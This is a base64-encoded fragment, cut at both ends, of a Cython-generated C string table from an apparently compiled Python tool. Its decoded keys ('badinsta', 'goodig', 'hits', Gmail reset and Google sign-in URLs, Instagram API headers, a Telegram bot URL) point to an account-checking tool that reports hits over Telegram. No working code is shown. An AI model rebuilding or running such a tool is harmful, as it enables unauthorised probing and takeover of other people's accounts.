xfSwgXG4gIHtfX3B5eF9rX1Bvc3RzLCBzaXplb2YoX19weXhfa19Qb3N0cyksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfUkVBTE1FLCBzaXplb2YoX19weXhfa19SRUFMTUUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX1JlbGF5TW9kZXJuLCBzaXplb2YoX19weXhfa19SZWxheU1vZGVybiksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfU0FNU1VORywgc2l6ZW9mKF9fcHl4X2tfU0FNU1VORyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfU01fVCwgc2l6ZW9mKF9fcHl4X2tfU01fVCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfU09OWSwgc2l6ZW9mKF9fcHl4X2tfU09OWSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfU3R5bGUsIHNpemVvZihfX3B5eF9rX1N0eWxlKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19UTCwgc2l6ZW9mKF9fcHl4X2tfVEwpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX1RocmVhZCwgc2l6ZW9mKF9fcHl4X2tfVGhyZWFkKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19Ub2tlbiwgc2l6ZW9mKF9fcHl4X2tfVG9rZW4pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX1RydWUsIHNpemVvZihfX3B5eF9rX1RydWUpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX1RydWVfMiwgc2l6ZW9mKF9fcHl4X2tfVHJ1ZV8yKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19Vc2VyX0FnZW50LCBzaXplb2YoX19weXhfa19Vc2VyX0FnZW50KSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19WSVZPLCBzaXplb2YoX19weXhfa19WSVZPKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19XSUZJLCBzaXplb2YoX19weXhfa19XSUZJKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19YSUFPTUksIHNpemVvZihfX3B5eF9rX1hJQU9NSSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfWF9CbG9rc19WZXJzaW9uX0lkLCBzaXplb2YoX19weXhfa19YX0Jsb2tzX1ZlcnNpb25fSWQpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX1hfRkJfSFRUUF9FbmdpbmUsIHNpemVvZihfX3B5eF9rX1hfRkJfSFRUUF9FbmdpbmUpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX1hfSUdfQXBwX0lELCBzaXplb2YoX19weXhfa19YX0lHX0FwcF9JRCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfWF9JR19CYW5kd2lkdGhfU3BlZWRfS0JQUywgc2l6ZW9mKF9fcHl4X2tfWF9JR19CYW5kd2lkdGhfU3BlZWRfS0JQUyksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfWF9JR19CYW5kd2lkdGhfVG90YWxCeXRlc19CLCBzaXplb2YoX19weXhfa19YX0lHX0JhbmR3aWR0aF9Ub3RhbEJ5dGVzX0IpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX1hfSUdfQmFuZHdpZHRoX1RvdGFsVGltZV9NUywgc2l6ZW9mKF9fcHl4X2tfWF9JR19CYW5kd2lkdGhfVG90YWxUaW1lX01TKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19YX0lHX0NhcGFiaWxpdGllcywgc2l6ZW9mKF9fcHl4X2tfWF9JR19DYXBhYmlsaXRpZXMpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX1hfSUdfQ29ubmVjdGlvbl9TcGVlZCwgc2l6ZW9mKF9fcHl4X2tfWF9JR19Db25uZWN0aW9uX1NwZWVkKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19YX0lHX0Nvbm5lY3Rpb25fVHlwZSwgc2l6ZW9mKF9fcHl4X2tfWF9JR19Db25uZWN0aW9uX1R5cGUpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX1hfUGlnZW9uX1Jhd2NsaWVudHRpbWUsIHNpemVvZihfX3B5eF9rX1hfUGlnZW9uX1Jhd2NsaWVudHRpbWUpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX1hfUGlnZW9uX1Nlc3Npb25fSWQsIHNpemVvZihfX3B5eF9rX1hfUGlnZW9uX1Nlc3Npb25fSWQpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX1pURSwgc2l6ZW9mKF9fcHl4X2tfWlRFKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19fMTAsIHNpemVvZihfX3B5eF9rX18xMCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfXzExLCBzaXplb2YoX19weXhfa19fMTEpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX18xMiwgc2l6ZW9mKF9fcHl4X2tfXzEyKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19fMTMsIHNpemVvZihfX3B5eF9rX18xMyksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfXzE0LCBzaXplb2YoX19weXhfa19fMTQpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX18xNSwgc2l6ZW9mKF9fcHl4X2tfXzE1KSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19fMTYsIHNpemVvZihfX3B5eF9rX18xNiksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfXzE3LCBzaXplb2YoX19weXhfa19fMTcpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX18xOSwgc2l6ZW9mKF9fcHl4X2tfXzE5KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19fMiwgc2l6ZW9mKF9fcHl4X2tfXzIpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX18zLCBzaXplb2YoX19weXhfa19fMyksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfXzQsIHNpemVvZihfX3B5eF9rX180KSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19fNSwgc2l6ZW9mKF9fcHl4X2tfXzUpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX182LCBzaXplb2YoX19weXhfa19fNiksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfXzcsIHNpemVvZihfX3B5eF9rX183KSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19fOCwgc2l6ZW9mKF9fcHl4X2tfXzgpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX185LCBzaXplb2YoX19weXhfa19fOSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfYSwgc2l6ZW9mKF9fcHl4X2tfYSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfYWNjZXB0LCBzaXplb2YoX19weXhfa19hY2NlcHQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2FjY2VwdF9sYW5ndWFnZSwgc2l6ZW9mKF9fcHl4X2tfYWNjZXB0X2xhbmd1YWdlKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19hY2NvdW50c19nb29nbGVfY29tLCBzaXplb2YoX19weXhfa19hY2NvdW50c19nb29nbGVfY29tKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19hZGlkLCBzaXplb2YoX19weXhfa19hZGlkKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19hbGlnbiwgc2l6ZW9mKF9fcHl4X2tfYWxpZ24pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2FuZHJvaWQsIHNpemVvZihfX3B5eF9rX2FuZHJvaWQpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2FwcGVuZCwgc2l6ZW9mKF9fcHl4X2tfYXBwZW5kKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZSwgc2l6ZW9mKF9fcHl4X2tfYXBwbGljYXRpb25feF93d3dfZm9ybV91cmxlbmNvZGUpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlXzIsIHNpemVvZihfX3B5eF9rX2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlXzIpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlXzMsIHNpemVvZihfX3B5eF9rX2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlXzMpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2FyX0lRX2FyX3FfMF85X2VuX0lRX3FfMF84X2VuX3EsIHNpemVvZihfX3B5eF9rX2FyX0lRX2FyX3FfMF85X2VuX0lRX3FfMF84X2VuX3EpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2FzeW5jaW9fY29yb3V0aW5lcywgc2l6ZW9mKF9fcHl4X2tfYXN5bmNpb19jb3JvdXRpbmVzKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19hdXRob3JpdHksIHNpemVvZihfX3B5eF9rX2F1dGhvcml0eSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfYXplcnR5dWlvcG1sa2poZ2Zkc3F3eGN2Ym4sIHNpemVvZihfX3B5eF9rX2F6ZXJ0eXVpb3BtbGtqaGdmZHNxd3hjdmJuKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19hemVydHl1aW9wbWxramhnZmRzcXd4Y3ZibkFaRVJUWSwgc2l6ZW9mKF9fcHl4X2tfYXplcnR5dWlvcG1sa2poZ2Zkc3F3eGN2Ym5BWkVSVFkpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2IsIHNpemVvZihfX3B5eF9rX2IpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2JhY2tncm91bmQsIHNpemVvZihfX3B5eF9rX2JhY2tncm91bmQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2JhZGVtYWlsLCBzaXplb2YoX19weXhfa19iYWRlbWFpbCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfYmFkaW5zdGEsIHNpemVvZihfX3B5eF9rX2JhZGluc3RhKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19iYmssIHNpemVvZihfX3B5eF9rX2JiayksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfYmlvLCBzaXplb2YoX19weXhfa19iaW8pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2Jpb2dyYXBoeSwgc2l6ZW9mKF9fcHl4X2tfYmlvZ3JhcGh5KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19iaXp6LCBzaXplb2YoX19weXhfa19iaXp6KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19ibGFjaywgc2l6ZW9mKF9fcHl4X2tfYmxhY2spLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2Jsb2NrLCBzaXplb2YoX19weXhfa19ibG9jayksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfYm8sIHNpemVvZihfX3B5eF9rX2JvKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19iczQsIHNpemVvZihfX3B5eF9rX2JzNCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfYzgwYzVmYjMwZGZhZTllMjczZTQwMDlmMDNiMTgyODAsIHNpemVvZihfX3B5eF9rX2M4MGM1ZmIzMGRmYWU5ZTI3M2U0MDA5ZjAzYjE4MjgwKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19jYywgc2l6ZW9mKF9fcHl4X2tfY2MpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2NlbnRlciwgc2l6ZW9mKF9fcHl4X2tfY2VudGVyKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19jZm9udHMsIHNpemVvZihfX3B5eF9rX2Nmb250cyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfY2hlY2tfb24sIHNpemVvZihfX3B5eF9rX2NoZWNrX29uKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19jaG9pY2UsIHNpemVvZihfX3B5eF9rX2Nob2ljZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfY2xhc3NfZ2V0aXRlbSwgc2l6ZW9mKF9fcHl4X2tfY2xhc3NfZ2V0aXRlbSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfY2xlYXIsIHNpemVvZihfX3B5eF9rX2NsZWFyKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19jbGluZV9pbl90cmFjZWJhY2ssIHNpemVvZihfX3B5eF9rX2NsaW5lX2luX3RyYWNlYmFjayksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfY2xvc2UsIHNpemVvZihfX3B5eF9rX2Nsb3NlKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19jbHMsIHNpemVvZihfX3B5eF9rX2NscyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfY29sb3JhbWEsIHNpemVvZihfX3B5eF9rX2NvbG9yYW1hKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19jb2xvcnMsIHNpemVvZihfX3B5eF9rX2NvbG9ycyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfY29udGVudF90eXBlLCBzaXplb2YoX19weXhfa19jb250ZW50X3R5cGUpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2NvbnRpbnVlX2h0dHBzXzNBXzJGXzJGbWFpbF9nb29nLCBzaXplb2YoX19weXhfa19jb250aW51ZV9odHRwc18zQV8yRl8yRm1haWxfZ29vZyksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfY29va2llcywgc2l6ZW9mKF9fcHl4X2tfY29va2llcyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfY3NyZnRva2VuLCBzaXplb2YoX19weXhfa19jc3JmdG9rZW4pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2RhdGEsIHNpemVvZihfX3B5eF9rX2RhdGEpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2RhdGFfaW5pdGlhbF9zZXR1cF9kYXRhX251bGxfbnVsLCBzaXplb2YoX19weXhfa19kYXRhX2luaXRpYWxfc2V0dXBfZGF0YV9udWxsX251bCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfZGF0ZSwgc2l6ZW9mKF9fcHl4X2tfZGF0ZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfZGF0ZXRpbWUsIHNpemVvZihfX3B5eF9rX2RhdGV0aW1lKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19kZXYsIHNpemVvZihfX3B5eF9rX2RldiksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfZGV2aWNlX2lkLCBzaXplb2YoX19weXhfa19kZXZpY2VfaWQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2RldmljZWluZm8sIHNpemVvZihfX3B5eF9rX2RldmljZWluZm8pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2Rpc2FibGUsIHNpemVvZihfX3B5eF9rX2Rpc2FibGUpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2RudCwgc2l6ZW9mKF9fcHl4X2tfZG50KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19kb2NfaWQsIHNpemVvZihfX3B5eF9rX2RvY19pZCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfZG9tYWluLCBzaXplb2YoX19weXhfa19kb21haW4pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2RwaSwgc2l6ZW9mKF9fcHl4X2tfZHBpKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19kdW1wcywgc2l6ZW9mKF9fcHl4X2tfZHVtcHMpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2UsIHNpemVvZihfX3B5eF9rX2UpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2VtYWlsLCBzaXplb2YoX19weXhfa19lbWFpbCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfZW5fR0JfZW5fVVMsIHNpemVvZihfX3B5eF9rX2VuX0dCX2VuX1VTKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19lbl9VU19lbl9xXzBfOSwgc2l6ZW9mKF9fcHl4X2tfZW5fVVNfZW5fcV8wXzkpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2VuX2VuX1VTX3FfMF85LCBzaXplb2YoX19weXhfa19lbl9lbl9VU19xXzBfOSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfZW5hYmxlLCBzaXplb2YoX19weXhfa19lbmFibGUpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2VuY29kaW5nLCBzaXplb2YoX19weXhfa19lbmNvZGluZyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfZW50ZXIsIHNpemVvZihfX3B5eF9rX2VudGVyKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19leGl0LCBzaXplb2YoX19weXhfa19leGl0KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19mLCBzaXplb2YoX19weXhfa19mKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19mX3JlcSwgc2l6ZW9mKF9fcHl4X2tfZl9yZXEpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2ZiX2FwaV9jYWxsZXJfY2xhc3MsIHNpemVvZihfX3B5eF9rX2ZiX2FwaV9jYWxsZXJfY2xhc3MpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSwgc2l6ZW9mKF9fcHl4X2tfZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19maWxlLCBzaXplb2YoX19weXhfa19maWxlKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19mbHVzaCwgc2l6ZW9mKF9fcHl4X2tfZmx1c2gpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2ZvbGxvd2VyX2NvdW50LCBzaXplb2YoX19weXhfa19mb2xsb3dlcl9jb3VudCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfZm9sbG93aW5nX2NvdW50LCBzaXplb2YoX19weXhfa19mb2xsb3dpbmdfY291bnQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2ZvbnQsIHNpemVvZihfX3B5eF9rX2ZvbnQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2Zvcm1hdF9udW1iZXIsIHNpemVvZihfX3B5eF9rX2Zvcm1hdF9udW1iZXIpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2Zvd2csIHNpemVvZihfX3B5eF9rX2Zvd2cpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2Zvd3MsIHNpemVvZihfX3B5eF9rX2Zvd3MpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2Z1bGxfbmFtZSwgc2l6ZW9mKF9fcHl4X2tfZnVsbF9uYW1lKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19mdW5jLCBzaXplb2YoX19weXhfa19mdW5jKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19nYywgc2l6ZW9mKF9fcHl4X2tfZ2MpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2dlbmVyYXRlX3VzZXJfYWdlbnQsIHNpemVvZihfX3B5eF9rX2dlbmVyYXRlX3VzZXJfYWdlbnQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2dlbmV4cHIsIHNpemVvZihfX3B5eF9rX2dlbmV4cHIpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2dldCwgc2l6ZW9mKF9fcHl4X2tfZ2V0KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19nZXRfZGljdCwgc2l6ZW9mKF9fcHl4X2tfZ2V0X2RpY3QpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2dmX3Vhcl8xLCBzaXplb2YoX19weXhfa19nZl91YXJfMSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfZ2csIHNpemVvZihfX3B5eF9rX2dnKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19nZ2IsIHNpemVvZihfX3B5eF9rX2dnYiksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfZ21haWxfY29tLCBzaXplb2YoX19weXhfa19nbWFpbF9jb20pLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2dtYWlsX2NvbV9SZXNldCwgc2l6ZW9mKF9fcHl4X2tfZ21haWxfY29tX1Jlc2V0KSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19nb29kaWcsIHNpemVvZihfX3B5eF9rX2dvb2RpZyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfZ29vZ2xlX2FjY291bnRzX3hzcmYsIHNpemVvZihfX3B5eF9rX2dvb2dsZV9hY2NvdW50c194c3JmKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19ncm91cCwgc2l6ZW9mKF9fcHl4X2tfZ3JvdXApLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2d1aWQsIHNpemVvZihfX3B5eF9rX2d1aWQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2d6aXBfZGVmbGF0ZSwgc2l6ZW9mKF9fcHl4X2tfZ3ppcF9kZWZsYXRlKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19oYXNobGliLCBzaXplb2YoX19weXhfa19oYXNobGliKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19oZTMsIHNpemVvZihfX3B5eF9rX2hlMyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaGVhZGVycywgc2l6ZW9mKF9fcHl4X2tfaGVhZGVycyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaGV4ZGlnZXN0LCBzaXplb2YoX19weXhfa19oZXhkaWdlc3QpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2hpdHMsIHNpemVvZihfX3B5eF9rX2hpdHMpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2hvc3QsIHNpemVvZihfX3B5eF9rX2hvc3QpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb20sIHNpemVvZihfX3B5eF9rX2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb20pLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fX19zaWduLCBzaXplb2YoX19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX19fc2lnbiksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9fX3NpZ25fMiwgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9fX3NpZ25fMiksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9zaWduaW4sIHNpemVvZihfX3B5eF9rX2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fc2lnbmluKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ251cCwgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9zaWdudXApLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fc2lnbnVwXzIsIHNpemVvZihfX3B5eF9rX2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fc2lnbnVwXzIpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2h0dHBzX2FwaV90ZWxlZ3JhbV9vcmdfYm90LCBzaXplb2YoX19weXhfa19odHRwc19hcGlfdGVsZWdyYW1fb3JnX2JvdCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfaHR0cHNfaV9pbnN0YWdyYW1fY29tX2FwaV92MV9hY2MsIHNpemVvZihfX3B5eF9rX2h0dHBzX2lfaW5zdGFncmFtX2NvbV9hcGlfdjFfYWNjKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19odHRwc193d3dfaW5zdGFncmFtX2NvbSwgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb20pLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2h0dHBzX3d3d19pbnN0YWdyYW1fY29tX2FwaV9ncmFwLCBzaXplb2YoX19weXhfa19odHRwc193d3dfaW5zdGFncmFtX2NvbV9hcGlfZ3JhcCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb21fY3Jpc3RpYW4sIHNpemVvZihfX3B5eF9rX2h0dHBzX3d3d19pbnN0YWdyYW1fY29tX2NyaXN0aWFuKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19pLCBzaXplb2YoX19weXhfa19pKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19pX2luc3RhZ3JhbV9jb20sIHNpemVvZihfX3B5eF9rX2lfaW5zdGFncmFtX2NvbSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfaWRzLCBzaXplb2YoX19weXhfa19pZHMpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2lnX3NpZ19rZXlfdmVyc2lvbiwgc2l6ZW9mKF9fcHl4X2tfaWdfc2lnX2tleV92ZXJzaW9uKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19pbXBvcnRsaWIsIHNpemVvZihfX3B5eF9rX2ltcG9ydGxpYiksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaW1wb3J0bGliX3V0aWwsIHNpemVvZihfX3B5eF9rX2ltcG9ydGxpYl91dGlsKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19pbmZvaW5zdGEsIHNpemVvZihfX3B5eF9rX2luZm9pbnN0YSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaW5pdGlhbGl6aW5nLCBzaXplb2YoX19weXhfa19pbml0aWFsaXppbmcpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2lucHV0LCBzaXplb2YoX19weXhfa19pbnB1dCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfaXNQcmFpc2UsIHNpemVvZihfX3B5eF9rX2lzUHJhaXNlKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19pc19idXNpbmVzcywgc2l6ZW9mKF9fcHl4X2tfaXNfYnVzaW5lc3MpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2lzX2Nvcm91dGluZSwgc2l6ZW9mKF9fcHl4X2tfaXNfY29yb3V0aW5lKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19pc19wcml2YXRlLCBzaXplb2YoX19weXhfa19pc19wcml2YXRlKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19pc192ZXJpZmllZCwgc2l6ZW9mKF9fcHl4X2tfaXNfdmVyaWZpZWQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2lzZW5hYmxlZCwgc2l6ZW9mKF9fcHl4X2tfaXNlbmFibGVkKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19qb2luLCBzaXplb2YoX19weXhfa19qb2luKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19qc29uLCBzaXplb2YoX19weXhfa19qc29uKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19rLCBzaXplb2YoX19weXhfa19rKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19rQTZEY2VCZG5OaU9NTUJ4TUc2Y1ppZDI3S093czFhMCwgc2l6ZW9mKF9fcHl4X2tfa0E2RGNlQmRuTmlPTU1CeE1HNmNaaWQyN0tPd3MxYTApLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2tlZXBfYWxpdmUsIHNpemVvZihfX3B5eF9rX2tlZXBfYWxpdmUpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX2xvZ28sIHNpemVvZihfX3B5eF9rX2xvZ28pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX2xzZCwgc2l6ZW9mKF9fcHl4X2tfbHNkKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19tLCBzaXplb2YoX19weXhfa19tKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19tX29wX3B5LCBzaXplb2YoX19weXhfa19tX29wX3B5KSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19tYWluLCBzaXplb2YoX19weXhfa19tYWluKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19tZDUsIHNpemVvZihfX3B5eF9rX21kNSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfbWVkaWFfY291bnQsIHNpemVvZihfX3B5eF9rX21lZGlhX2NvdW50KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19tZXRhLCBzaXplb2YoX19weXhfa19tZXRhKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19taWRfYUhpWDJnQUxBQUV6QUoyT19jUjlYc1QyTlNXNSwgc2l6ZW9mKF9fcHl4X2tfbWlkX2FIaVgyZ0FMQUFFekFKMk9fY1I5WHNUMk5TVzUpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX21vZHVsZSwgc2l6ZW9mKF9fcHl4X2tfbW9kdWxlKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19uMSwgc2l